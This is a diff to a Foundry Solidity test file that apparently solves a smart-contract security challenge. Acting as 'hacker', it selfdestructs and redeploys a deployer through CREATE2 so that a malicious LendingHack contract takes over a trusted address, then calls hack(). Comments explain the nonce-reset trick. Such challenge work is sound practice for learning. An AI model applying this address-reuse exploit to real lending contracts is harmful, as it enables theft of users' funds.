@@ -72,12 +72,19 @@ contract Challenge3Test is Test {
         // forge test --match-contract Challenge3Test -vvvv                   //
         //////////////////////////////////////////////////////////////////////*/
 
-
+        createDeployer.cleanUp();
+        lendingPool.emergencyStop();
 
     
         //====================================================================//
         vm.stopPrank();
     }
+    // The create2Deployer is going to create always a createDeployer with the same address (passing always the same salt).
+    // This means that if the createDeployer is selfdestructed and and redeployed by create2Deployer, it will have the same address.
+    // In this way the nonce for contract deployment from create2Deployer is resetted. So the next contract deployed by createDeployer
+    // is going to have the same address as the previous one because 
+    // contract address = last 20 bytes of sha3(rlp_encode(sender, nonce))
+    // with sender being the createDeployer in our case. (sender is the same as before due to the constant salt/ CREATE2 opcode)
 
     function testExploit() public {
         vm.startPrank(hacker);
@@ -89,7 +96,12 @@ contract Challenge3Test is Test {
         // forge test --match-contract Challenge3Test -vvvv           //
         //////////////////////////////////////////////////////////////*/
 
+        
 
+        createDeployer = CreateDeployer(create2Deployer.deploy());
+
+        lendingHack = LendingHack(createDeployer.deploy(false, address(usdc)));
+        lendingHack.hack();
 
 
         //=============================================================//
